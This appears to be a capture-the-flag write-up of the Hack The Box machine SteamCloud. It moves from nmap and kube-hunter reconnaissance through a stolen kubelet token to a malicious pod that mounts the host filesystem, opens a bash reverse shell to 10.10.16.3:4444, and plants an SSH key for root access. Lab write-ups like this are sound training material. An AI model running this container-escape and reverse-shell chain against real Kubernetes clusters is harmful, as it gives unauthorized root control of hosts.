\chapter{XXXXX}
\begin{itemize}
    \item {\bf technics}: 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Recon}
\subsection{nmap}
\begin{verbatim}
$ nmapz 10.10.11.133
TCP ports found: 22,2379,2380,8443,10249,10250,10256
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-24 03:47 CET
Nmap scan report for 10.10.11.133
Host is up (0.059s latency).

PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 fcfb90ee7c73a1d4bf87f871e844c63c (RSA)
|   256 46832b1b01db71646a3e27cb536f81a1 (ECDSA)
|_  256 1d8dd341f3ffa437e8ac780889c2e3c5 (ED25519)
2379/tcp  open  ssl/etcd-client?
| tls-alpn:
|_  h2
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2023-02-24T02:46:15
|_Not valid after:  2024-02-24T02:46:16
|_ssl-date: TLS randomness does not represent time
2380/tcp  open  ssl/etcd-server?
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2023-02-24T02:46:15
|_Not valid after:  2024-02-24T02:46:16
| tls-alpn:
|_  h2
|_ssl-date: TLS randomness does not represent time
8443/tcp  open  ssl/https-alt
| tls-alpn:
|   h2
|_  http/1.1
| fingerprint-strings:
|   FourOhFourRequest:
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 6e5573e9-0b6e-43a5-abf3-4ba20487cbd5
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 736df266-2884-416d-ad9d-aeb2f50576d0
|     X-Kubernetes-Pf-Prioritylevel-Uid: 5ca20b8c-03db-486b-b83d-be789f121579
|     Date: Fri, 24 Feb 2023 02:47:26 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GenericLines, Help, RTSPRequest, SSLSessionReq:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   HTTPOptions:
|     HTTP/1.0 403 Forbidden
|     Audit-Id: 6833ae93-f8eb-45ed-aa4f-b9f9a7f1522f
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 736df266-2884-416d-ad9d-aeb2f50576d0
|     X-Kubernetes-Pf-Prioritylevel-Uid: 5ca20b8c-03db-486b-b83d-be789f121579
|     Date: Fri, 24 Feb 2023 02:47:26 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2023-02-23T02:46:13
|_Not valid after:  2026-02-23T02:46:13
|_ssl-date: TLS randomness does not represent time
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| tls-alpn:
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| ssl-cert: Subject: commonName=steamcloud@1677206778
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2023-02-24T01:46:18
|_Not valid after:  2024-02-24T01:46:18
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).

\end{verbatim}


\section{port 8443}
\begin{verbatim}
$ curl -i -k https://10.10.11.133:8443
HTTP/2 403
audit-id: c476ce8a-0e0c-47df-846b-b7911cc9edef
cache-control: no-cache, private
content-type: application/json
x-content-type-options: nosniff
x-kubernetes-pf-flowschema-uid: 736df266-2884-416d-ad9d-aeb2f50576d0
x-kubernetes-pf-prioritylevel-uid: 5ca20b8c-03db-486b-b83d-be789f121579
content-length: 233
date: Fri, 24 Feb 2023 02:50:58 GMT

{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {

  },
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {

  },
  "code": 403
}
\end{verbatim}

c'est parti pour une folle phase de doc sur \verb+k8s+


\section{k8s}

\begin{verbatim}
(benmusashi@honbu):[~/documents/pentesting-games/htb/steamcloud]
$ kube-hunter --remote 10.10.11.133
Started hunting
Discovering Open Kubernetes Services
Found open service "Etcd" at 10.10.11.133:2379
Found open service "Kubelet API" at 10.10.11.133:10250
Found vulnerability "Anonymous Authentication" in 10.10.11.133:10250
Found vulnerability "Exposed Pods" in 10.10.11.133:10250
Found vulnerability "Cluster Health Disclosure" in 10.10.11.133:10250
Found vulnerability "Exposed Running Pods" in 10.10.11.133:10250
Found vulnerability "Exposed Kubelet Cmdline" in 10.10.11.133:10250
Found vulnerability "Exposed Container Logs" in 10.10.11.133:10250
Found vulnerability "Exposed Run Inside Container" in 10.10.11.133:10250
Found vulnerability "Exposed System Logs" in 10.10.11.133:10250

...SNIP...
Vulnerabilities
For further information about a vulnerability, search its ID in:
https://avd.aquasec.com/
+--------+--------------------+----------------------+----------------------+----------------------+----------------------+
| ID     | LOCATION           | MITRE CATEGORY       | VULNERABILITY        | DESCRIPTION          | EVIDENCE             |
+--------+--------------------+----------------------+----------------------+----------------------+----------------------+
| KHV043 | 10.10.11.133:10250 | Initial Access //    | Cluster Health       | By accessing the     | status: ok           |
|        |                    | General Sensitive    | Disclosure           | open /healthz        |                      |
|        |                    | Information          |                      | handler,             |                      |
|        |                    |                      |                      |     an attacker      |                      |
|        |                    |                      |                      | could get the        |                      |
|        |                    |                      |                      | cluster health state |                      |
|        |                    |                      |                      | without              |                      |
|        |                    |                      |                      | authenticating       |                      |
+--------+--------------------+----------------------+----------------------+----------------------+----------------------+
| KHV052 | 10.10.11.133:10250 | Discovery // Access  | Exposed Pods         | An attacker could    | count: 8             |
|        |                    | Kubelet API          |                      | view sensitive       |                      |
|        |                    |                      |                      | information about    |                      |
|        |                    |                      |                      | pods that are        |                      |
|        |                    |                      |                      |     bound to a Node  |                      |
|        |                    |                      |                      | using the /pods      |                      |
|        |                    |                      |                      | endpoint             |                      |
+--------+--------------------+----------------------+----------------------+----------------------+----------------------+
| KHV046 | 10.10.11.133:10250 | Discovery // Access  | Exposed Kubelet      | Commandline flags    | cmdline: /var/lib/mi |
|        |                    | Kubelet API          | Cmdline              | that were passed to  | nikube/binaries/v1.2 |
|        |                    |                      |                      | the kubelet can be   | 2.3/kubelet--        |
|        |                    |                      |                      | obtained from the    | bootstrap-kubeconfig |
|        |                    |                      |                      | pprof endpoints      | =/etc/kubernetes/boo |
|        |                    |                      |                      |                      | tstrap...            |
+--------+--------------------+----------------------+----------------------+----------------------+----------------------+
| KHV038 | 10.10.11.133:10250 | Discovery // Access  | Exposed Running Pods | Outputs a list of    | 8 running pods       |
|        |                    | Kubelet API          |                      | currently running    |                      |
|        |                    |                      |                      | pods,                |                      |
|        |                    |                      |                      |     and some of      |                      |
|        |                    |                      |                      | their metadata,      |                      |
|        |                    |                      |                      | which can reveal     |                      |
|        |                    |                      |                      | sensitive            |                      |
|        |                    |                      |                      | information          |                      |
+--------+--------------------+----------------------+----------------------+----------------------+----------------------+
\end{verbatim}


\begin{verbatim}
$ ./kubeletctl -s 10.10.11.133 pods


$ ./kubeletctl -s 10.10.11.133 scan token
$ ~/Downloads/kubeletctl -s 10.10.11.133 scan token |grep -A1 -B4 Output
$ export TOKEN=eyJhb...SNIP...pi10CZ1obAfRhQ
 alias kubectlz="kubectl --token=$TOKEN --server=https://10.10.11.133:8443  --insecure-skip-tls-verify=true"
$ kubectlz auth can-i --list
$ kubectlz auth can-i --list
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []               [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []               [create]
pods                                            []                                    []               [get create list]
\end{verbatim}

donc on peut creer des pods

donc on va creer un pod sur l'image nginx en montant le filesystem de la
machine.

\begin{verbatim}
$ cat jubeaz.yml 
apiVersion: v1
kind: Pod
metadata:
  name: jubeaz2
  namespace: default
spec:
  containers:
  - name: jubeaz2
    image: nginx:1.14.2
    command: ["/bin/bash"]
    args: ["-c", "/bin/bash -i >& /dev/tcp/10.10.16.3/4444 0>&1"]
    volumeMounts:
    - mountPath: /mnt
      name: hostfs
  volumes:
  - name: hostfs
    hostPath:
      path: /
  automountServiceAccountToken: true
  hostNetwork: true

$ kubectlz apply -f ./jubeaz.yml 
pod/jubeaz2 created

$ nc -lnvp 4444
Listening on 0.0.0.0 4444
Connection received on 10.10.11.133 37916
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell

root@steamcloud:/tmp# mkdir -p /mnt/root/.ssh
mkdir -p /mnt/root/.ssh
# echo 'ssh-ed25519 AAAAC...SNIP...YXBDMKYKW jubeaz@jubeaz' > /mnt/root/.ssh/authorized_keys
\end{verbatim}


\begin{verbatim}
$ ssh -i id_rsa root@10.10.11.133

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jan 10 09:00:00 2022
root@steamcloud:~#
\end{verbatim}
